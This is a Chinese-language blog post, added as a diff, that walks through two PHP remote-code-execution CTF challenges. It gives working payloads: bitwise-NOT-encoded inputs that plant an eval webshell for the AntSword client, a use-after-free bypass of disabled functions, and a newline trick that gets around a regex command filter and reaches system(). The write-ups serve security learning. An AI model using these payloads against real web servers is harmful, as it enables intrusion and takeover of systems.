@@ -1,0 +1,127 @@
+---
+layout: post
+title:  RCE
+date:   2021-07-22 00:01:01 +0300
+image:  2021-07-22-candle.jpg
+tags:   [ctf,web,RCE]
+---
+
+RCE(remote command/code execute)，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
+
+### [极客大挑战 2019]RCE ME
+
+```assembly
+<?php
+error_reporting(0);
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if(strlen($code)>40){
+        die("This is too Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
+    }
+    @eval($code);
+}
+else{
+    highlight_file(__FILE__);
+}
+
+// ?>
+```
+
+过滤了`所有英文字母和数字`，但是我们知道ASCII码中还有很多`字母数字之外的字符`，利用这些字符进行**取反**或**异或**可以得到我们想要的字符
+
+> PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号
+
+```
+<?php
+echo urlencode(~"phpinfo");
+```
+
+`%8F%97%8F%96%91%99%90`
+
+因为是取反，所以还要再次取反，而且要加分号。
+
+`?code=(~%8F%97%8F%96%91%99%90)();`
+
+在phpinfo查看禁用的系统函数
+
+| Directive         | Local Value                                                  | Master Value                                                 |
+| ----------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| disable_functions | pcntl_alarm,<br>pcntl_fork,<br/>pcntl_waitpid,<br/>pcntl_wait,<br/>pcntl_wifexited,<br/>pcntl_wifstopped,<br/>pcntl_wifsignaled,<br/>pcntl_wifcontinued,<br/>pcntl_wexitstatus,<br/>pcntl_wtermsig,<br/>pcntl_wstopsig,<br/>pcntl_signal,<br/>pcntl_signal_get_handler,<br/>pcntl_signal_dispatch,<br/>pcntl_get_last_error,<br/>pcntl_strerror,pcntl_sigprocmask,<br/>pcntl_sigwaitinfo,<br/>pcntl_sigtimedwait,pcntl_exec,<br/>pcntl_getpriority,<br/>pcntl_setpriority,<br/>pcntl_async_signals,<br/>system,exec,<br/>shell_exec,<br/>popen,<br/>proc_open,<br/>passthru,<br/>symlink,link,<br/>syslog,<br/>imap_open,<br/>ld,<br/>dl | pcntl_alarm,<br/>pcntl_fork,<br/>pcntl_waitpid,<br/>pcntl_wait,<br/>pcntl_wifexited,<br/>pcntl_wifstopped,<br/>pcntl_wifsignaled,<br/>pcntl_wifcontinued,<br/>pcntl_wexitstatus,<br/>pcntl_wtermsig,<br/>pcntl_wstopsig,<br/>pcntl_signal,<br/>pcntl_signal_get_handler,<br/>pcntl_signal_dispatch,<br/>pcntl_get_last_error,<br/>pcntl_strerror,<br/>pcntl_sigprocmask,<br/>pcntl_sigwaitinfo,<br/>pcntl_sigtimedwait,<br/>pcntl_exec,<br/>pcntl_getpriority,<br/>pcntl_setpriority,<br/>pcntl_async_signals,<br/>system,<br/>exec,<br/>shell_exec,<br/>popen,<br/>proc_open,<br/>passthru,<br/>symlink,<br/>link,<br/>syslog,<br/>imap_open,<br/>ld,<br/>dl |
+
+构造一个shell连上蚁剑
+
+```assembly
+<?php
+
+error_reporting(0);
+$a = 'assert';
+$b = urlencode(~$a);
+echo $b;
+echo "\n";
+$c = '(eval($_POST[melody]))';
+$d = urlencode(~$c);
+echo $d;
+```
+
+`%9E%8C%8C%9A%8D%8B
+%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%9A%93%90%9B%86%A2%D6%D6`
+
+`/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%9A%93%90%9B%86%A2%D6%D6);`
+
+连接蚁剑后，看到根目录下存在flag和readflag文件，应该是通过执行readflag来读取flag。但是无法读取flag，考虑到rce，又禁用那么多系统函数。利用PHP7的UAF，通过蚁剑的绕过disable_functions来执行。选择PHP_GC_UAF，点击开始。cd到根目录，执行`./readflag`
+
+flag{3c7b1b32-998c-4bdf-bd3c-9a28ca47ca42}
+
+### [FBCTF2019]RCEService
+
+题目给了源码
+
+```assembly
+<?php
+
+putenv('PATH=/home/rceservice/jail');
+
+if (isset($_REQUEST['cmd'])) {
+  $json = $_REQUEST['cmd'];
+
+  if (!is_string($json)) {
+    echo 'Hacking attempt detected<br/><br/>';
+  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'Hacking attempt detected<br/><br/>';
+  } else {
+    echo 'Attempting to run command:<br/>';
+    $cmd = json_decode($json, true)['cmd'];
+    if ($cmd !== NULL) {
+      system($cmd);
+    } else {
+      echo 'Invalid input';
+    }
+    echo '<br/><br/>';
+  }
+}
+
+?>
+```
+
+过滤的很严，但是可以绕过preg_match函数本身
+
+第一种方法：因为preg_match只会去匹配第一行，所以这里可以用多行进行绕过
+
+源码中可以看到putenv('PATH=/home/rceservice/jail')已经修改了环境变量，我们只能用绝对路径来调用系统命令
+
+cat命令在/bin中保存
+
+所以构造出payload，%0A是换行符
+
+```assembly
+{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}
+```
+
+不知道为什么不能直接在表单框里输入，要在url中输入。
+
+`?cmd={%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}`
+
+flag{34edc62e-623e-4380-8be6-3252086e72aa}
